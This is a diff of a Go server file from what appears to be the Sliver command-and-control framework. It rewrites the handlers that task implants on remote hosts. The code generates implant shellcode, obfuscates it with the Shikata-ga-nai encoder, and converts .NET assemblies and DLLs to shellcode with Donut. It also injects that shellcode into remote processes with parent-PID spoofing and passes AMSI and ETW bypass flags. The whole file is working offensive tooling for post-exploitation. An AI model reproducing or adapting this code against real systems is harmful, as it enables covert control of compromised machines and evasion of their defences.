@@ -21,27 +21,37 @@ package rpc
 import (
 	"bytes"
 	"context"
-	"debug/pe"
 	"encoding/binary"
 	"fmt"
-	"io/ioutil"
-	"log"
 	"os"
-	"path"
+	"path/filepath"
 	"strings"
 
+	"github.com/Binject/debug/pe"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/assets"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/cryptography"
+	"github.com/bishopfox/sliver/server/db"
+	"github.com/bishopfox/sliver/server/db/models"
 	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/server/log"
+	"github.com/bishopfox/sliver/server/sgn"
 
-	"github.com/golang/protobuf/proto"
+	"google.golang.org/grpc/codes"
+	"google.golang.org/grpc/status"
+	"google.golang.org/protobuf/proto"
+)
+
+var (
+	tasksLog = log.NamedLogger("rpc", "tasks")
 )
 
 // Task - Execute shellcode in-memory
 func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.Task, error) {
-	resp := &sliverpb.Task{}
+	resp := &sliverpb.Task{Response: &commonpb.Response{}}
 	err := rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
@@ -56,18 +66,44 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
-	shellcode, err := getSliverShellcode(req.Config.GetName())
+	name := filepath.Base(req.Config.GetName())
+	shellcode, arch, err := getSliverShellcode(name)
 	if err != nil {
-		config := generate.ImplantConfigFromProtobuf(req.Config)
-		config.Name = ""
-		config.Format = clientpb.ImplantConfig_SHELLCODE
-		config.ObfuscateSymbols = false
-		shellcodePath, err := generate.SliverShellcode(config)
+		name, config := generate.ImplantConfigFromProtobuf(req.Config)
+		if name == "" {
+			name, err = codenames.GetCodename()
+			if err != nil {
+				return nil, err
+			}
+		}
+		config.Format = clientpb.OutputFormat_SHELLCODE
+		config.ObfuscateSymbols = true
+		otpSecret, _ := cryptography.TOTPServerSecret()
+		err = generate.GenerateConfig(name, config, true)
 		if err != nil {
 			return nil, err
 		}
-		shellcode, err = ioutil.ReadFile(shellcodePath)
+		shellcodePath, err := generate.SliverShellcode(name, otpSecret, config, true)
+		if err != nil {
+			return nil, err
+		}
+		shellcode, _ = os.ReadFile(shellcodePath)
 	}
+
+	if len(shellcode) < 1 {
+		return nil, status.Error(codes.OutOfRange, "shellcode is zero bytes")
+	}
+
+	switch req.Encoder {
+
+	case clientpb.ShellcodeEncoder_SHIKATA_GA_NAI:
+		shellcode, err = sgn.EncodeShellcode(shellcode, arch, 1, []byte{})
+		if err != nil {
+			return nil, err
+		}
+
+	}
+
 	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
 		Request: req.Request,
 		Data:    shellcode,
@@ -91,43 +127,62 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 
 // ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
 func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+	var session *core.Session
+	var beacon *models.Beacon
+	var err error
+	if !req.Request.Async {
+		session = core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+	} else {
+		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			tasksLog.Errorf("%s", err)
+			return nil, ErrDatabaseFailure
+		}
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
 	}
 
-	// We have to add the hosting DLL to the request before forwarding it to the implant
-	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
-	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
+	shellcode, err := generate.DonutFromAssembly(
+		req.Assembly,
+		req.IsDLL,
+		req.Arch,
+		req.Arguments,
+		req.Method,
+		req.ClassName,
+		req.AppDomain,
+	)
 	if err != nil {
-		return nil, err
-	}
-	offset, err := getExportOffset(hostingDllPath, "ReflectiveLoader")
-	if err != nil {
-		return nil, err
-	}
-	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
-		Request:    req.Request,
-		Assembly:   req.Assembly,
-		HostingDll: hostingDllBytes,
-		Arguments:  req.Arguments,
-		Process:    req.Process,
-		AmsiBypass: req.AmsiBypass,
-		EtwBypass:  req.EtwBypass,
-		Offset:     offset,
-	})
-	if err != nil {
+		tasksLog.Errorf("Execute assembly failed: %s", err)
 		return nil, err
 	}
 
-	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
-	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
-	if err != nil {
-		return nil, err
+	resp := &sliverpb.ExecuteAssembly{Response: &commonpb.Response{}}
+	if req.InProcess {
+		tasksLog.Infof("Executing assembly in-process")
+		invokeInProcExecAssembly := &sliverpb.InvokeInProcExecuteAssemblyReq{
+			Data:       req.Assembly,
+			Runtime:    req.Runtime,
+			Arguments:  strings.Split(req.Arguments, " "),
+			AmsiBypass: req.AmsiBypass,
+			EtwBypass:  req.EtwBypass,
+			Request:    req.Request,
+		}
+		err = rpc.GenericHandler(invokeInProcExecAssembly, resp)
+	} else {
+		invokeExecAssembly := &sliverpb.InvokeExecuteAssemblyReq{
+			Data:        shellcode,
+			Process:     req.Process,
+			Request:     req.Request,
+			PPid:        req.PPid,
+			ProcessArgs: req.ProcessArgs,
+		}
+		err = rpc.GenericHandler(invokeExecAssembly, resp)
+
 	}
-	resp := &sliverpb.ExecuteAssembly{}
-	err = proto.Unmarshal(respData, resp)
 	if err != nil {
 		return nil, err
 	}
@@ -136,46 +191,47 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 
 // Sideload - Sideload a DLL on the remote system (Windows only)
 func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
-	session := core.Sessions.Get(req.Request.SessionID)
-	if session == nil {
-		return nil, ErrInvalidSessionID
+	var (
+		session *core.Session
+		beacon  *models.Beacon
+		err     error
+		arch    string
+	)
+	if !req.Request.Async {
+		session = core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+		arch = session.Arch
+	} else {
+		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			msfLog.Errorf("%s", err)
+			return nil, ErrDatabaseFailure
+		}
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
+		arch = beacon.Arch
 	}
 
-	var err error
-	var respData []byte
-	timeout := rpc.getTimeout(req)
-	switch session.ToProtobuf().GetOS() {
-	case "windows":
-		shellcode, err := generate.ShellcodeRDIFromBytes(req.Data, req.EntryPoint, req.Args)
+	if getOS(session, beacon) == "windows" {
+		shellcode, err := generate.DonutShellcodeFromPE(req.Data, arch, false, req.Args, "", req.EntryPoint, req.IsDLL, req.IsUnicode)
 		if err != nil {
+			tasksLog.Errorf("Sideload failed: %s", err)
 			return nil, err
 		}
-		data, err := proto.Marshal(&sliverpb.SideloadReq{
+		req = &sliverpb.SideloadReq{
 			Request:     req.Request,
 			Data:        shellcode,
 			ProcessName: req.ProcessName,
-		})
-		if err != nil {
-			return nil, err
+			Kill:        req.Kill,
+			PPid:        req.PPid,
+			ProcessArgs: req.ProcessArgs,
 		}
-		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, data)
-	case "darwin":
-		fallthrough
-	case "linux":
-		reqData, err := proto.Marshal(req)
-		if err != nil {
-			return nil, err
-		}
-		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, reqData)
-	default:
-		err = fmt.Errorf("%s does not support sideloading", session.ToProtobuf().GetOS())
 	}
-	if err != nil {
-		return nil, err
-	}
-
-	resp := &sliverpb.Sideload{}
-	err = proto.Unmarshal(respData, resp)
+	resp := &sliverpb.Sideload{Response: &commonpb.Response{}}
+	err = rpc.GenericHandler(req, resp)
 	if err != nil {
 		return nil, err
 	}
@@ -183,38 +239,106 @@ func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sl
 }
 
 // SpawnDll - Spawn a DLL on the remote system (Windows only)
-func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sliverpb.SpawnDll, error) {
-	resp := &sliverpb.SpawnDll{}
-	err := rpc.GenericHandler(req, resp)
+func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq) (*sliverpb.SpawnDll, error) {
+	var session *core.Session
+	var beacon *models.Beacon
+	var err error
+	if !req.Request.Async {
+		session = core.Sessions.Get(req.Request.SessionID)
+		if session == nil {
+			return nil, ErrInvalidSessionID
+		}
+	} else {
+		beacon, err = db.BeaconByID(req.Request.BeaconID)
+		if err != nil {
+			msfLog.Errorf("%s", err)
+			return nil, ErrDatabaseFailure
+		}
+		if beacon == nil {
+			return nil, ErrInvalidBeaconID
+		}
+	}
+
+	resp := &sliverpb.SpawnDll{Response: &commonpb.Response{}}
+	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
+	if err != nil {
+		return nil, err
+	}
+	spawnDLLReq := &sliverpb.SpawnDllReq{
+		Data:        req.Data,
+		Offset:      offset,
+		ProcessName: req.ProcessName,
+		Args:        req.Args,
+		Request:     req.Request,
+		Kill:        req.Kill,
+		PPid:        req.PPid,
+		ProcessArgs: req.ProcessArgs,
+	}
+	err = rpc.GenericHandler(spawnDLLReq, resp)
 	if err != nil {
 		return nil, err
 	}
 	return resp, nil
 }
 
+func getOS(session *core.Session, beacon *models.Beacon) string {
+	if session != nil {
+		return session.OS
+	}
+	if beacon != nil {
+		return beacon.OS
+	}
+	return ""
+}
+
 // Utility functions
-func getSliverShellcode(name string) ([]byte, error) {
+func getSliverShellcode(name string) ([]byte, string, error) {
 	var data []byte
-	// get implants builds
-	configs, err := generate.ImplantConfigMap()
+	build, err := db.ImplantBuildByName(name)
 	if err != nil {
-		return data, err
+		return nil, "", err
 	}
-	// get the implant with the same name
-	if conf, ok := configs[name]; ok {
-		if conf.Format == clientpb.ImplantConfig_SHELLCODE {
-			fileData, err := generate.ImplantFileByName(name)
-			if err != nil {
-				return data, err
-			}
-			data = fileData
-		} else {
-			err = fmt.Errorf("no existing shellcode found")
+
+	switch build.ImplantConfig.Format {
+
+	case clientpb.OutputFormat_SHELLCODE:
+		fileData, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return []byte{}, "", err
 		}
-	} else {
-		err = fmt.Errorf("no sliver found with this name")
+		data = fileData
+
+	case clientpb.OutputFormat_EXECUTABLE:
+		// retrieve EXE from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
+		if err != nil {
+			return []byte{}, "", err
+		}
+		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", false, false)
+		if err != nil {
+			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
+			return []byte{}, "", err
+		}
+
+	case clientpb.OutputFormat_SHARED_LIB:
+		// retrieve DLL from db
+		fileData, err := generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return []byte{}, "", err
+		}
+		data, err = generate.ShellcodeRDIFromBytes(fileData, "StartW", "")
+		if err != nil {
+			return []byte{}, "", err
+		}
+
+	case clientpb.OutputFormat_SERVICE:
+		fallthrough
+	default:
+		err = fmt.Errorf("no existing shellcode found")
 	}
-	return data, err
+
+	return data, build.ImplantConfig.GOARCH, err
 }
 
 // ExportDirectory - stores the Export data
@@ -247,7 +371,7 @@ func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
 	nameFOA := rvaToFoa(nameRva, fpe)
 	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
 	if err != nil {
-		log.Fatal(err)
+		tasksLog.Fatal(err)
 		return ""
 	}
 	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
@@ -262,18 +386,64 @@ func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32)
 	return funcOffset
 }
 
-func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
-	rawData, err := ioutil.ReadFile(filepath)
+// func getExportOffsetFromFile(filepath string, exportName string) (funcOffset uint32, err error) {
+// 	rawData, err := ioutil.ReadFile(filepath)
+// 	if err != nil {
+// 		return 0, err
+// 	}
+// 	handle, err := os.Open(filepath)
+// 	if err != nil {
+// 		return 0, err
+// 	}
+// 	defer handle.Close()
+// 	fpe, _ := pe.NewFile(handle)
+// 	var exportDirectoryRVA uint32
+// 	switch (fpe.OptionalHeader).(type) {
+// 	case *pe.OptionalHeader32:
+// 		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+// 	case *pe.OptionalHeader64:
+// 		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+// 	}
+// 	var offset = rvaToFoa(exportDirectoryRVA, fpe)
+// 	exportDir := ExportDirectory{}
+// 	buff := &bytes.Buffer{}
+// 	buff.Write(rawData[offset:])
+// 	err = binary.Read(buff, binary.LittleEndian, &exportDir)
+// 	if err != nil {
+// 		return 0, err
+// 	}
+// 	current := exportDir.AddressOfNames
+// 	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
+// 	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
+// 	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)
+
+// 	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
+// 		index := nameArrayFOA + i*8
+// 		name := getFuncName(index, rawData, fpe)
+// 		if strings.Contains(name, exportName) {
+// 			ordIndex := ordinalArrayFOA + i*2
+// 			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
+// 		}
+// 		current += uint32(binary.Size(i))
+// 	}
+
+// 	return
+// }
+
+func getExportOffsetFromMemory(rawData []byte, exportName string) (funcOffset uint32, err error) {
+	peReader := bytes.NewReader(rawData)
+	fpe, err := pe.NewFile(peReader)
 	if err != nil {
 		return 0, err
 	}
-	handle, err := os.Open(filepath)
-	if err != nil {
-		return 0, err
+
+	var exportDirectoryRVA uint32
+	switch (fpe.OptionalHeader).(type) {
+	case *pe.OptionalHeader32:
+		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+	case *pe.OptionalHeader64:
+		exportDirectoryRVA = fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
 	}
-	defer handle.Close()
-	fpe, _ := pe.NewFile(handle)
-	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
 	var offset = rvaToFoa(exportDirectoryRVA, fpe)
 	exportDir := ExportDirectory{}
 	buff := &bytes.Buffer{}
